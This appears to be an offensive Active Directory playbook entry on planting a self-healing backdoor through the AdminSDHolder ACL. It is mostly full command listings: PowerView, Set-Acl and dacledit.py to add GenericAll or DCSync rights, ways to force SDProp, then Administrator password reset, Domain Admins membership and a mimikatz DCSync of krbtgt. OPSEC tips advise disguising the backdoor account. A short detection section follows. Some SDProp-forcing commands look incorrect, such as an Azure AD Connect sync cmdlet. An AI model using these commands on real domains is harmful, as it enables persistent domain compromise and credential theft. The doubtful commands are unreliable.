---
title: "Attack #26 — AdminSDHolder Persistence via ACL"
description: "AdminSDHolder is a built-in Active Directory persistence mechanism that attackers can abuse for permanent, self-healing backdoor access. The…"
category: active-directory
tags: ["active-directory", "adcs", "credential-access", "persistence"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #26 — AdminSDHolder Persistence via ACL.md"
---
# 🟡 Attack #26 — AdminSDHolder Persistence via ACL

***

## 📖 How It Works

AdminSDHolder is a **built-in Active Directory persistence mechanism** that attackers can abuse for permanent, self-healing backdoor access. The `CN=AdminSDHolder,CN=System` container holds a **template security descriptor** that is automatically applied to all "protected" AD objects — including Domain Admins, Enterprise Admins, Account Operators, Server Operators, and their members — by the **Security Descriptor Propagator (SDProp)** process, which runs **every 60 minutes** by default.

If an attacker modifies the AdminSDHolder object's ACL to include a backdoor ACE (e.g., granting their user GenericAll or DCSync rights), that ACE will be **automatically propagated to every protected object in the domain** within 60 minutes. Even if a defender removes the backdoor ACE from individual protected objects, SDProp will **re-apply it from AdminSDHolder** on the next cycle — making it a self-healing persistence mechanism.

### Protected Groups (Subject to SDProp)

```
- Domain Admins          - Enterprise Admins
- Schema Admins          - Administrators
- Account Operators      - Server Operators
- Print Operators        - Backup Operators
- Domain Controllers     - Read-only Domain Controllers
- Cert Publishers        - Replicator
```

### The Full Attack Flow

```
1. Achieve Domain Admin (or WriteDACL on AdminSDHolder)
2. Modify AdminSDHolder ACL — add your user with GenericAll/DCSync rights
3. Wait 60 minutes (or trigger SDProp manually)
4. SDProp propagates your backdoor ACE to ALL protected objects
5. Even if blue team removes your ACE from target objects,
   SDProp re-applies it from AdminSDHolder on next cycle
6. Persist indefinitely until AdminSDHolder ACL is cleaned
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **WriteDACL on AdminSDHolder** | Requires DA or specific ACL access to AdminSDHolder |
| **Domain Admin (typical)** | Most common way to reach AdminSDHolder |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **PowerView** | Windows | `Add-DomainObjectAcl` targeting AdminSDHolder |
| **Impacket — dacledit.py** | Linux | Remote ACL modification |
| **bloodyAD** | Linux | ACL manipulation |

***

## 💻 Full Commands

### 🔴 Add Backdoor ACE to AdminSDHolder

```powershell
# ── PowerView — add GenericAll for backdoor user ──────────────────────────────
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All -Verbose

# ── Or add DCSync rights ──────────────────────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backdoor_user -Rights DCSync -Verbose

# ── Or using Set-ACL directly ─────────────────────────────────────────────────
$ASDHPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$UserSID = (Get-ADUser backdoor_user).SID
$ACL = Get-Acl $ASDHPath
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  $UserSID, "GenericAll", "Allow"
)
$ACL.AddAccessRule($ACE)
Set-Acl -Path $ASDHPath -AclObject $ACL
```

```bash
# ── dacledit.py ───────────────────────────────────────────────────────────────
dacledit.py -action write -rights FullControl \
  -principal backdoor_user \
  -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  corp.local/Administrator:'Password1' -dc-ip 10.10.10.10
```

### 🔴 Force SDProp to Run Immediately (Don't Wait 60 Minutes)

```powershell
# ── Method 1: Invoke SDProp via rootDSE modify ───────────────────────────────
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("FixUpInheritance", 1)
$rootDSE.SetInfo()

# ── Method 2: PowerShell AD Module ───────────────────────────────────────────
Invoke-ADSDPropagation
# Or:
Start-ADSyncCycle -PolicyType Delta

# ── Method 3: Protected Runspace ──────────────────────────────────────────────
$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("DC01.corp.local")
$mod = New-Object System.DirectoryServices.Protocols.ModifyRequest("", 
  [System.DirectoryServices.Protocols.DirectoryAttributeModification]@{
    Name = "RunProtectAdminGroupsTask"; Operation = "Replace"; Values = "1"
  }
)
$ldap.SendRequest($mod)
```

### 🔴 Verify Propagation

```powershell
# ── Check if your ACE was propagated to Domain Admins ─────────────────────────
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | 
  Where-Object { $_.IdentityReference -match "backdoor_user" }

# ── Should show GenericAll or DCSync rights propagated from AdminSDHolder ─────
```

### 🔴 Exploit the Propagated Rights

```powershell
# ── After SDProp propagation, backdoor_user has GenericAll on ALL protected objects ─
# Reset any DA password:
Set-DomainUserPassword -Identity Administrator -AccountPassword (
  ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
)

# Add yourself to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members backdoor_user

# DCSync:
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

***

## 🎯 OPSEC Tips

- **Self-healing** — even if defenders remove your ACE from individual DA/EA objects, SDProp re-applies it every 60 minutes
- **Requires DA to set up** — this is a persistence technique, not an initial escalation
- **AdminSDHolder modifications are RARE** in legitimate operations — any change should trigger immediate investigation
- **Don't use obvious accounts** — create a service account or technical account as the backdoor principal
- **SDProp also sets `adminCount=1`** on affected users — this is an IOC that defenders can query for

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Object access on AdminSDHolder |
| **5136** | Security Log (DC) | Directory modification — nTSecurityDescriptor change on AdminSDHolder |
| **4780** | Security Log (DC) | SDProp applied ACL to a protected object |
| **4670** | Security Log (DC) | Permissions changed on AdminSDHolder container |

**Primary detection:** Baseline the AdminSDHolder SDDL and alert on **ANY change**. AdminSDHolder modifications are exceptionally rare in legitimate operations — any modification is a critical severity alert. Additionally, query for users with `adminCount=1` who shouldn't have it.

***

## 🔗 Attack Chain Context

```
[AdminSDHolder Persistence] ──→ Self-Healing Backdoor Access
         │
         ├──→ 🔄 SDProp re-applies your ACE every 60 minutes
         ├──→ 🔒 Survives: ACE removal from individual objects, password changes
         ├──→ 🎯 Affects: ALL protected groups (DA, EA, Schema, etc.)
         ├──→ 🔗 Prereqs: Domain Admin or WriteDACL on AdminSDHolder
         └──→ 💀 Defeated by: baseline AdminSDHolder ACL, monitor 5136, alert on ANY change
```

***

> ✅ **Attack #26 — AdminSDHolder Persistence complete.**

***

> 🏁 **Category 3 — ACL / Permission Abuse is now COMPLETE (8/8 attacks).**
